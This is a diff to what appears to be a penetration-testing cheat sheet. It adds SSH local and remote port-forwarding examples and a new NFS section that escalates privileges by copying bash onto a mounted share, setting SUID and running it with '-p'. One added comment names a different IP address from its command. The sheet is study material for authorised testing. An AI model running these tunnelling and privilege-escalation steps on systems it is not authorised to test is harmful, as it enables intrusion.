@@ -44,6 +44,7 @@
 41. [Powershell Empire](#Powershell-Empire)
 42. [SQL Enumeration](#SQL-Enumeration)
 42. [POP3](#POP3)
+43. [NFS](#NFS)
 
 <sub><sup>:warning: For educational purposes only! Do not run any of the commantds on a network or hardware that you do not own!</sup></sub>
 
@@ -2867,12 +2868,16 @@ sudo service rinetd restart
 ### ssh
 ```
 sudo ssh -N -L [bind_address:]port:host:hostport [username@address]
+sudo ssh -N -L 127.0.0.1:1234:10.10.10.10:5678 user@10.10.10.10
+# open 1234 locally and forward it to 11.11.11.11 on port 5678
 ```
 
 ## SSH Remote Port Forwarding 
 Port is opened on the remote side
 ```
 ssh -N -R [bind_address:]port:host:hostport [username@address]
+ssh -N -R 10.10.10.10:4444:127.0.0.1:5555 user@10.10.10.10
+# open port 4444 on 10.10.10.10 and forward ot to 127.0.0.1 port 5555
 ```
 ## SSH Dynamic Port Forwarding
 Use proxy to tunnel any incoming traffic on local port to any remote destination
@@ -3089,3 +3094,24 @@ USER username
 PASS password
 LIST # list all mails
 RETR 1 # retreive mail 1
+```
+
+# NFS
+Mount the share
+```
+mount -t nfs -o port=4445 127.0.0.1:/srv/Share /tmp/pe -o nolock
+```
+Create directory and copy bash into it
+```
+mkdir /tmp/pe
+cd /tmp/pe
+cp /bin/bash .
+```
+set SUID
+```
+chmod +s bash
+```
+run as user
+```
+./bash -p
+```
